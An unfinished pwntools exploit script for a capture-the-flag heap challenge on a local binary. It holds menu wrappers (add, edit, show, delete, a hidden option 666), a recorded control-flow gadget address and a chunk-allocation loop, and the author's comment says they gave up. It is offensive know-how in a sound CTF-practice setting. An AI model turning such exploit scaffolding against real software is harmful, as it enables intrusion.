"""
root下没环境，不想搞了，无语>_<
"""
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n, timeout=1).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True, timeout=1).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True, timeout=1).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
info   = lambda s, n : print("\033[31m["+s+" -> "+str(hex(n))+"]\033[0m")
sh     = lambda      : io.interactive()
menu   = b''
def add(idx, name, gend=1, flag=True):
	sla(menu, b'1')
	sla(b'index?', byte(idx))
	sla(b'gender.', byte(gend))
	if flag:
		sla(b'name:', name)
	else:
		sda(b'name:', name)

def edit_name(idx, name, flag=True):
	sla(menu, b'2')
	sla(b'index?', byte(idx))
	if flag:
		sla(b'name:', name)
	else:
		sda(b'name:', name)

def show(idx):
	sla(menu, b'3')
	sla(b'index?', byte(idx))

def dele(idx):
	sla(menu, b'4')
	sla(b'index?', byte(idx))

def edit_des(idx, des, flag=True):
	sla(menu, b'5')
	sla(b'index?', byte(idx))
	if flag:
		sla(b'description:', des)
	else:
		sda(b'description:', des)

def backdoor():
	sla(menu, b'666')


magic_gadget = 0x00000000001547a0
"""
mov rdx, qword ptr [rdi + 8]; 
mov qword ptr [rsp], rax; 
call qword ptr [rdx + 0x20];
"""

for i in range(10):
	add(i, b'A')



debug()
sh()
